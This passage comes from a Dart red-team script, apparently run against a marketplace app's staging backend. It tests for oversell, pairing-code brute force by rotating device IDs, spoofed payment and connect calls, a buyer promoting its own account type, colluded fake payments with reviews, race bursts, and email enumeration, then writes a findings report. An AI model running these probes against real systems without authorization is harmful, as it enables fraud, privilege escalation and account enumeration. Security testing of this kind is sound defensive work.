  c['mkt_order'] = {'http': mkt.statusCode, 'body': clip(mkt.body, 300)};
  Map<String, dynamic>? mktOrder;
  final md = decode(mkt);
  if (md is List && md.isNotEmpty) {
    mktOrder = Map<String, dynamic>.from(md.first as Map);
  }

  if (mktOrder != null) {
    final pay = await rest(
      'PATCH',
      '/rest/v1/orders?id=eq.${mktOrder['id']}',
      headers: hUser(sellerJwt),
      body: {'status': 'pago'},
    );
    c['mkt_seller_pago'] = {
      'http': pay.statusCode,
      'body': clip(pay.body, 300),
    };
    final pd2 = decode(pay);
    if (pd2 is List && pd2.isNotEmpty) {
      mktOrder = Map<String, dynamic>.from(pd2.first as Map);
    }
  }

  // Convert reservation too
  if (res != null) {
    final conv = await rest(
      'PATCH',
      '/rest/v1/live_reservation_requests?id=eq.${res['id']}',
      headers: hUser(sellerJwt),
      body: {'status': 'converted'},
    );
    c['res_converted'] = {
      'http': conv.statusCode,
      'body': clip(conv.body, 250),
    };
  }

  final prodAfter = await sb.select('products', filter: 'id=eq.$pid', limit: 1);
  final resAfter = res == null
      ? []
      : await sb.select(
          'live_reservation_requests',
          filter: 'id=eq.${res['id']}',
          limit: 1,
        );
  final ordAfter = mktOrder == null
      ? []
      : await sb.select('orders', filter: 'id=eq.${mktOrder['id']}', limit: 1);

  c['after'] = {
    'product': prodAfter.isEmpty ? null : prodAfter.first,
    'reservation': resAfter.isEmpty ? null : resAfter.first,
    'order': ordAfter.isEmpty
        ? null
        : {
            'id': ordAfter.first['id'],
            'status': ordAfter.first['status'],
            'stock_units_applied': ordAfter.first['stock_units_applied'],
          },
  };

  final resStatus =
      '${(resAfter.isEmpty ? res : resAfter.first)?['status'] ?? ''}'
          .toLowerCase();
  final ordStatus =
      '${(ordAfter.isEmpty ? mktOrder : ordAfter.first)?['status'] ?? ''}'
          .toLowerCase();
  final stockApplied =
      num.tryParse('${ordAfter.isEmpty ? 0 : ordAfter.first['stock_units_applied'] ?? 0}') ??
          0;
  final qtyLeft =
      num.tryParse('${prodAfter.isEmpty ? 0 : prodAfter.first['quantity'] ?? 0}') ??
          0;

  final liveConsumed =
      resStatus == 'accepted' || resStatus == 'converted';
  final mktConsumed = ordStatus == 'pago' || stockApplied > 0;

  if (liveConsumed && mktConsumed) {
    noteFinding(
      id: 'RTB2-STOCK-01',
      sev: 'P1',
      title:
          'Dois consumos da mesma unidade: reserva LIVE + order marketplace paga',
      actor: 'buyer JWT + seller JWT (mesmas contas, dois módulos)',
      preconditions: 'product.quantity=1; live_item.quantity=1; mesmo product_id',
      before: {'product_qty': 1, 'live_item_qty': 1},
      after: {
        'reservation_status': resStatus,
        'order_status': ordStatus,
        'stock_units_applied': stockApplied,
        'product_qty_after': qtyLeft,
      },
      impact:
          'Pools independentes: capacidade live e stock marketplace — oversell semântico.',
      repro:
          'Aceitar reserva live qty=1; seller marca pago numa order marketplace do mesmo produto.',
    );
  }

  cycles.add(c);
}

Future<void> cyclePairingOcr() async {
  final c = <String, dynamic>{'cycle': 'pairing_ocr'};
  final claim1 = await rest(
    'POST',
    '/functions/v1/ps-pairing-claim',
    headers: hAnon(),
    body: {'code': '000000', 'device_id': 'rtb2-dev-a'},
  );
  c['claim_000000'] = {
    'http': claim1.statusCode,
    'body': clip(claim1.body, 300),
  };

  // Rotate device_id: 8 attempts — check if rate limit is per-device only.
  var limited = 0;
  var invalid = 0;
  for (var i = 0; i < 8; i++) {
    final r = await rest(
      'POST',
      '/functions/v1/ps-pairing-claim',
      headers: hAnon(),
      body: {
        'code': (100000 + i).toString().padLeft(6, '0'),
        'device_id': 'rtb2-rot-$i-${Random().nextInt(9999)}',
      },
    );
    if (r.statusCode == 429 || r.body.contains('rate_limited')) limited++;
    if (r.body.contains('invalid')) invalid++;
  }
  c['rotate_device'] = {'limited': limited, 'invalid': invalid, 'n': 8};
  if (limited == 0 && invalid >= 6) {
    noteFinding(
      id: 'RTB2-PS-02',
      sev: 'P2',
      title:
          'Rate-limit de pairing é por device_id — rotação evade o tecto de 40/h',
      actor: 'anon',
      result: c['rotate_device'],
      impact:
          'Espaço 10^6; com N device_ids o brute-force de códigos activos torna-se prático.',
      repro: 'POST ps-pairing-claim com device_id novo a cada tentativa.',
    );
  }

  final ocr = await rest(
    'POST',
    '/functions/v1/ingest-ocr-reservation',
    headers: {
      ...hAnon(),
      'x-device-token': 'deadbeefdeadbeef',
    },
    body: {
      'live_id': '00000000-0000-0000-0000-000000000001',
      'ocr_line_hash': 'abcdefghijkl',
      'detected_at': DateTime.now().toUtc().toIso8601String(),
      'ref_number': 1,
    },
  );
  c['ocr_fake_token'] = {'http': ocr.statusCode, 'body': clip(ocr.body, 250)};
  cycles.add(c);
}

Future<void> cycleEdgeConfusedDeputy() async {
  final c = <String, dynamic>{'cycle': 'edge_confused_deputy'};
  // Payment intent POST as buyer with seller as buyer_id
  final pi = await rest(
    'POST',
    '/functions/v1/create-payment-intent',
    headers: hUser(buyerJwt),
    body: {
      'buyer_id': sellerId,
      'order_id': '00000000-0000-0000-0000-000000000001',
      'amount': 100,
      'shipping_method': 'hand',
    },
  );
  c['pi_spoof_buyer'] = {'http': pi.statusCode, 'body': clip(pi.body, 300)};

  // GET settle without JWT
  final settle = await rest(
    'GET',
    '/functions/v1/create-payment-intent?checkout_return=success&session_id=cs_test_fake',
    headers: hAnon(),
  );
  c['settle_anon_fake'] = {
    'http': settle.statusCode,
    'body': clip(settle.body, 250),
  };

  // Tip: live of seller, seller_id = buyer (confused)
  final lives = await sb.select(
    'lives',
    filter: 'seller_id=eq.$sellerId',
    limit: 1,
  );
  if (lives.isNotEmpty) {
    final tip = await rest(
      'POST',
      '/functions/v1/create-live-tip-checkout',
      headers: hUser(buyerJwt),
      body: {
        'live_id': lives.first['id'],
        'seller_id': buyerId,
        'amount_eur': 1,
      },
    );
    c['tip_wrong_seller'] = {
      'http': tip.statusCode,
      'body': clip(tip.body, 250),
    };
    final tip2 = await rest(
      'POST',
      '/functions/v1/create-live-tip-checkout',
      headers: hUser(buyerJwt),
      body: {
        'seller_id': sellerId,
        'amount_eur': 1,
      },
    );
    c['tip_no_live'] = {'http': tip2.statusCode, 'body': clip(tip2.body, 250)};
  }

  final connect = await rest(
    'POST',
    '/functions/v1/create-connect-account',
    headers: hUser(buyerJwt),
    body: {'user_id': sellerId, 'amount': 1, 'idempotency_key': 'rtb2xxxx'},
  );
  c['connect_spoof_user'] = {
    'http': connect.statusCode,
    'body': clip(connect.body, 250),
  };

  final mux = await rest(
    'POST',
    '/functions/v1/create-mux-live',
    headers: hUser(buyerJwt),
    body: {'title': 'RTB2 hijack live'},
  );
  c['mux_as_buyer'] = {'http': mux.statusCode, 'body': clip(mux.body, 250)};

  final ut = await rest(
    'PATCH',
    '/rest/v1/profiles?id=eq.$buyerId',
    headers: hUser(buyerJwt),
    body: {'user_type': 'vendedor'},
  );
  c['buyer_patch_user_type'] = {
    'http': ut.statusCode,
    'body': clip(ut.body, 200),
  };
  if (ut.statusCode >= 200 && ut.statusCode < 300) {
    final mux2 = await rest(
      'POST',
      '/functions/v1/create-mux-live',
      headers: hUser(buyerJwt),
      body: {'title': 'RTB2 after type flip'},
    );
    c['mux_after_type_flip'] = {
      'http': mux2.statusCode,
      'body': clip(mux2.body, 250),
    };
    if (mux2.statusCode == 200 && mux2.body.contains('stream')) {
      noteFinding(
        id: 'RTB2-MUX-02',
        sev: 'P1',
        title: 'Buyer promove user_type e cria stream Mux',
        actor: 'buyer JWT',
        result: {'mux': clip(mux2.body, 200)},
        impact: 'Autoridade de vendedor fabricada + credenciais de ingestão.',
      );
    }
    await rest(
      'PATCH',
      '/rest/v1/profiles?id=eq.$buyerId',
      headers: hSvc(),
      body: {'user_type': 'comprador'},
    );
  }

  // Refund as buyer (should 403)
  final refund = await rest(
    'POST',
    '/functions/v1/refund-order',
    headers: hUser(buyerJwt),
    body: {'order_id': '00000000-0000-0000-0000-000000000001'},
  );
  c['refund_as_buyer'] = {
    'http': refund.statusCode,
    'body': clip(refund.body, 200),
  };

  cycles.add(c);
}

Future<void> cycleCollusionState() async {
  final c = <String, dynamic>{'cycle': 'collusion_offplatform_pago'};
  final prod = await sellerProduct();
  if (prod == null) {
    cycles.add(c);
    return;
  }
  final ins = await rest(
    'POST',
    '/rest/v1/orders',
    headers: hUser(buyerJwt),
    body: {
      'buyer_id': buyerId,
      'product_id': prod['id'],
      'quantity': 1,
      'status': 'reserva_pendente',
      'payment_method': 'MB WAY',
    },
  );
  c['insert'] = {'http': ins.statusCode, 'body': clip(ins.body, 250)};
  Map<String, dynamic>? order;
  final d = decode(ins);
  if (d is List && d.isNotEmpty) {
    order = Map<String, dynamic>.from(d.first as Map);
  }
  if (order == null) {
    cycles.add(c);
    return;
  }
  final oid = order['id'].toString();
  final walBefore = await sb.select('wallets', filter: 'id=eq.$sellerId', limit: 1);
  final pay = await rest(
    'PATCH',
    '/rest/v1/orders?id=eq.$oid',
    headers: hUser(sellerJwt),
    body: {'status': 'pago'},
  );
  c['seller_pago'] = {'http': pay.statusCode, 'body': clip(pay.body, 300)};
  final after = await sb.select('orders', filter: 'id=eq.$oid', limit: 1);
  final walAfter = await sb.select('wallets', filter: 'id=eq.$sellerId', limit: 1);
  c['order'] = after.isEmpty
      ? null
      : {
          'status': after.first['status'],
          'stock_units_applied': after.first['stock_units_applied'],
          'amount_paid_cents': after.first['amount_paid_cents'],
        };
  final b0 = walBefore.isEmpty
      ? null
      : num.tryParse('${walBefore.first['balance']}');
  final b1 =
      walAfter.isEmpty ? null : num.tryParse('${walAfter.first['balance']}');
  c['wallet_delta'] = {'before': b0, 'after': b1};

  if (after.isNotEmpty &&
      '${after.first['status']}'.toLowerCase() == 'pago') {
    final conc = await rest(
      'PATCH',
      '/rest/v1/orders?id=eq.$oid',
      headers: hUser(buyerJwt),
      body: {'status': 'concluido'},
    );
    c['buyer_concluido'] = {
      'http': conc.statusCode,
      'body': clip(conc.body, 250),
    };
    final rev = await rest(
      'POST',
      '/rest/v1/reviews',
      headers: hUser(buyerJwt),
      body: {
        'order_id': oid,
        'stars': 5,
        'comment': 'rtb2 collusion',
        'target_id': sellerId,
        'author_role': 'comprador',
      },
    );
    c['review'] = {'http': rev.statusCode, 'body': clip(rev.body, 250)};
    if (rev.statusCode >= 200 &&
        rev.statusCode < 300 &&
        !rev.body.toLowerCase().contains('unpaid')) {
      noteFinding(
        id: 'RTB2-REP-01',
        sev: 'P1',
        title:
            'Conluio: seller marca pago off-platform sem dinheiro → review 5★',
        actor: 'buyer+seller collusion',
        request: {
          'patch_pago': 'seller JWT',
          'patch_concluido': 'buyer JWT',
          'insert_review': 'buyer JWT',
        },
        after: {
          'order_status': after.first['status'],
          'review_http': rev.statusCode,
          'wallet_delta': c['wallet_delta'],
        },
        impact:
            'Reputação (e possivelmente stock) sem captura Stripe / pagamento real.',
      );
    }
  }

  await rest(
    'PATCH',
    '/rest/v1/orders?id=eq.$oid',
    headers: hSvc(),
    body: {'status': 'cancelado'},
  );
  cycles.add(c);
}

Future<void> cycleRacesAndPartial() async {
  final c = <String, dynamic>{'cycle': 'races_partial'};
  // Burst: two buyers cannot exist; use same buyer double-accept style.
  // Parallel PATCH reservation if we have one pending.
  final pending = await sb.select(
    'live_reservation_requests',
    filter: 'seller_id=eq.$sellerId&status=eq.pending',
    limit: 3,
  );
  if (pending.isNotEmpty) {
    final id = pending.first['id'];
    final futs = List.generate(
      8,
      (_) => rest(
        'PATCH',
        '/rest/v1/live_reservation_requests?id=eq.$id',
        headers: hUser(sellerJwt),
        body: {'status': 'accepted'},
      ),
    );
    final rs = await Future.wait(futs);
    c['burst_accept'] = rs.map((r) => r.statusCode).toList();
    races.add({
      'name': 'reservation_accept_burst',
      'https': c['burst_accept'],
    });
  } else {
    gaps.add('sem reservation pending para race');
  }

  // Crash inject refund — only if we have a paid stripe order of seller
  final paid = await sb.select(
    'orders',
    filter:
        'seller_id=eq.$sellerId&status=eq.pago&stripe_payment_intent_id=not.is.null',
    limit: 1,
  );
  if (paid.isEmpty) {
    gaps.add('sem order Stripe paga do seller para crash-inject');
  } else {
    final env = loadLiveOpsStagingEnv();
    final secret = env['FLEABER_STAGING_CRASH_INJECT_SECRET'] ?? '';
    if (secret.length >= 16) {
      final r = await http.post(
        Uri.parse('$base/functions/v1/refund-order'),
        headers: {
          ...hUser(sellerJwt),
          'x-fleaber-crash-inject-secret': secret,
          'x-fleaber-crash-inject': 'after_stripe_before_db',
        },
        body: jsonEncode({'order_id': paid.first['id']}),
      );
      c['crash_inject'] = {
        'http': r.statusCode,
        'body': clip(r.body, 300),
        'order': paid.first['id'],
      };
      stripeEv.add({
        'kind': 'refund_crash_inject',
        'http': r.statusCode,
        'body': clip(r.body, 200),
      });
      final after = await sb.select(
        'orders',
        filter: 'id=eq.${paid.first['id']}',
        limit: 1,
      );
      c['order_after_crash'] = after.isEmpty
          ? null
          : {
              'status': after.first['status'],
              'stripe_refund_id': after.first['stripe_refund_id'],
            };
    }
  }
  cycles.add(c);
}

Future<void> cycleReputationRefund() async {
  final c = <String, dynamic>{'cycle': 'reputation_after_refund'};
  final rows = await sb.select(
    'reviews',
    filter: 'buyer_id=eq.$buyerId&order=created_at.desc',
    limit: 10,
  );
  var found = false;
  for (final rev in rows) {
    final oid = rev['order_id']?.toString();
    if (oid == null || oid.isEmpty) continue;
    final ords = await sb.select('orders', filter: 'id=eq.$oid', limit: 1);
    if (ords.isEmpty) continue;
    final st = '${ords.first['status']}'.toLowerCase();
    if (st.contains('reembols') ||
        st == 'devolvida' ||
        st == 'cancelado' ||
        (ords.first['stripe_refund_id'] ?? '').toString().isNotEmpty) {
      found = true;
      c['example'] = {
        'review_id': rev['id'],
        'stars': rev['stars'],
        'order_status': st,
        'purchase_verified': rev['purchase_verified'],
      };
      noteFinding(
        id: 'RTB2-REP-02',
        sev: 'P2',
        title: 'Review permanece após refund/cancelamento da order',
        actor: 'estado legado (observação)',
        result: c['example'],
        impact:
            'Reputação não acompanha o reembolso — abuso se combinado com collusion pago.',
      );
      break;
    }
  }
  if (!found) {
    c['no_refunded_reviewed_order'] = true;
    gaps.add('sem par review+order reembolsada nas fixtures');
  }
  cycles.add(c);
}

Future<void> cycleLastSaturation() async {
  final c = <String, dynamic>{'cycle': 'last_saturation'};
  // Extra: bag checkout mix, prize flag, email enum as seller, waitlist double accept
  final emailR = await rest(
    'POST',
    '/rest/v1/rpc/batata_find_user_id_by_email',
    headers: hUser(sellerJwt),
    body: {'p_email': envEmailHint()},
  );
  c['email_as_seller'] = {
    'http': emailR.statusCode,
    'body': clip(emailR.body, 120),
  };
  if (emailR.statusCode == 200 &&
      emailR.body.contains('-') &&
      !emailR.body.contains('null')) {
    noteFinding(
      id: 'RTB2-ENUM-01',
      sev: 'P2',
      title: 'Seller resolve email→UUID (enumera contas)',
      actor: 'seller JWT',
      result: {'http': emailR.statusCode, 'uuid_returned': true},
      impact: 'Enumeração de utilizadores por email (rate 30/h).',
    );
  }

  final wait = await sb.select(
    'live_reservation_requests',
    filter: 'seller_id=eq.$sellerId&status=eq.pending',
    limit: 5,
  );
  c['pending_count'] = wait.length;

  // Public catalog storage of other users' product photos is expected.
  final pub = await http.post(
    Uri.parse('$base/storage/v1/object/list/chat_media'),
    headers: hAnon(),
    body: jsonEncode({'prefix': 'product_photos/', 'limit': 5}),
  );
  c['anon_list_product_photos'] = {
    'http': pub.statusCode,
    'body': clip(pub.body, 200),
  };

  cycles.add(c);
}

Future<void> writeDeliverables() async {
  final p0 = findings.where((f) => f['severity'] == 'P0').length;
  final p1 = findings.where((f) => f['severity'] == 'P1').length;
  final p2 = findings.where((f) => f['severity'] == 'P2').length;
  final verdict = p0 > 0
      ? 'FAIL_P0'
      : p1 > 0
          ? 'FAIL_P1'
          : findings.isEmpty
              ? 'PASS_CEGO_SATURADO'
              : 'INCONCLUSIVO';

  final moneyCreate = findings.any((f) =>
          f['id'] == 'RTB2-WAL-01' ||
          (f['id'] == 'RTB2-STOCK-01' && f['severity'] == 'P0'))
      ? 'SIM'
      : findings.any((f) => f['id'] == 'RTB2-STOCK-01')
          ? 'NÃO COMPROVADO'
          : 'NÃO COMPROVADO';
  final oversell = findings.any((f) => f['id'] == 'RTB2-STOCK-01')
      ? 'SIM'
      : 'NÃO COMPROVADO';
  final authz = findings.any((f) =>
          '${f['id']}'.contains('WAL') ||
          '${f['id']}'.contains('MUX-02') ||
          '${f['id']}'.contains('BANK'))
      ? 'SIM'
      : 'NÃO';
  final cross = findings.any((f) =>
          '${f['id']}'.contains('STOR') ||
          '${f['id']}'.contains('PII') ||
          '${f['id']}'.contains('ORD') ||
          '${f['id']}'.contains('MUX-01'))
      ? 'SIM'
      : 'NÃO';
  final raceP = races.any((r) => r['exploited'] == true) ? 'SIM' : 'NÃO';
  final chain = findings.any((f) =>
          '${f['id']}'.contains('BANK') ||
          '${f['id']}'.contains('STOR') ||
          '${f['id']}'.contains('STOCK') ||
          '${f['id']}'.contains('REP-01'))
      ? 'SIM'
      : 'NÃO';
  final partial = stripeEv.isNotEmpty ? 'NÃO COMPROVADO' : 'NÃO';
  final sens = cross;
  final lastNew = findings.any((f) =>
      f['id'] == 'RTB2-ENUM-01' && f['severity'] == 'P0' ||
      f['id'] == 'RTB2-ENUM-01' && f['severity'] == 'P1');

  rec['frozen_at'] = DateTime.now().toUtc().toIso8601String();
  rec['project'] = stagingRef;
  rec['findings'] = findings;
  rec['races'] = races;
  rec['stripe_evidence'] = stripeEv;
  rec['gaps'] = gaps;
  rec['cycles'] = cycles;
  rec['verdict'] = verdict;
  rec['counts'] = {'P0': p0, 'P1': p1, 'P2': p2};

  final dir = Directory('tool/reports/redteam_blind_b_$stamp');
  dir.createSync(recursive: true);
  File('${dir.path}/REDTEAM_BLIND_B_$stamp.json')
      .writeAsStringSync(const JsonEncoder.withIndent('  ').convert(rec));

  final md = StringBuffer()
    ..writeln('# RED TEAM CEGO B — $stamp')
    ..writeln()
    ..writeln('**FROZEN_AT:** ${rec['frozen_at']}')
    ..writeln('**Project:** $stagingRef (staging)')
    ..writeln('**PRODUÇÃO TOCADA:** NÃO')
    ..writeln('**FASE 4:** NÃO')
    ..writeln()
    ..writeln('## Mapa de ataque')
    ..writeln()
    ..writeln('- Tabelas PostgREST: ${(rec['tables_exposed'] as List).length}')
    ..writeln('- RPCs: ${(rec['rpcs_exposed'] as List).length}')
    ..writeln(
        '- RPCs financeiras/autoridade: ${jsonEncode(rec['rpcs_financial_or_auth'])}')
    ..writeln()
    ..writeln('Fronteiras atacadas: PostgREST, RPC, Edge (checkout, tip, connect, refund, Mux, pairing, OCR), Storage.')
    ..writeln()
    ..writeln('## Findings')
    ..writeln();
  if (findings.isEmpty) {
    md.writeln('_Nenhum P0/P1/P2 comprovado neste freeze._');
  }
  for (final f in findings) {
    md
      ..writeln('### ${f['id']} — ${f['title']}')
      ..writeln()
      ..writeln('- **Severidade:** ${f['severity']}')
      ..writeln('- **Actor:** ${f['actor']}')
      ..writeln('- **Pré-condições:** ${f['preconditions'] ?? '—'}')
      ..writeln('- **Pedido:** `${jsonEncode(f['request'])}`')
      ..writeln('- **Antes:** `${jsonEncode(f['before'])}`')
      ..writeln('- **Resultado:** `${jsonEncode(f['result'])}`')
      ..writeln('- **Depois:** `${jsonEncode(f['after'])}`')
      ..writeln('- **Impacto:** ${f['impact']}')
      ..writeln('- **Reprodução:** ${f['reproduction'] ?? '—'}')
      ..writeln();
  }
  md
    ..writeln('## Races')
    ..writeln()
    ..writeln(jsonEncode(races))
    ..writeln()
    ..writeln('## Stripe evidence')
    ..writeln()
    ..writeln(jsonEncode(stripeEv))
    ..writeln()
    ..writeln('## Lacunas')
    ..writeln();
  for (final g in gaps) {
    md.writeln('- $g');
  }
  md
    ..writeln()
    ..writeln('## Saturação')
    ..writeln()
    ..writeln('Ciclos: recon, identidade financeira, storage composição, mint order+banking, wallet RPC, privacidade REST, dual-pool stock, pairing/OCR, Edge confused deputy, collusion estados, races/parcial, reputação+refund, último ciclo enum/waitlist.')
    ..writeln()
    ..writeln('Último ciclo encontrou nova classe P0/P1: ${lastNew ? 'SIM' : 'NÃO'}')
    ..writeln()
    ..writeln('## Veredicto')
    ..writeln()
    ..writeln('| Campo | Valor |')
    ..writeln('|---|---|')
    ..writeln('| P0 | $p0 |')
    ..writeln('| P1 | $p1 |')
    ..writeln('| P2 | $p2 |')
    ..writeln('| Criação líquida de dinheiro | $moneyCreate |')
    ..writeln('| Oversell válido | $oversell |')
    ..writeln('| Bypass de autoridade | $authz |')
    ..writeln('| Cross-user | $cross |')
    ..writeln('| Race P0/P1 | $raceP |')
    ..writeln('| Cadeia multi-módulo P0/P1 | $chain |')
    ..writeln('| Falha parcial explorável | $partial |')
    ..writeln('| Exposição sensível | $sens |')
    ..writeln('| SATURAÇÃO | ${lastNew ? 'NÃO' : 'SIM'} |')
    ..writeln('| VEREDICTO | $verdict |');

  File('${dir.path}/REDTEAM_BLIND_B_$stamp.md').writeAsStringSync(md.toString());
  File('REDTEAM_BLIND_B_$stamp.md').writeAsStringSync(md.toString());
  File('REDTEAM_BLIND_B_$stamp.json')
      .writeAsStringSync(const JsonEncoder.withIndent('  ').convert(rec));
}
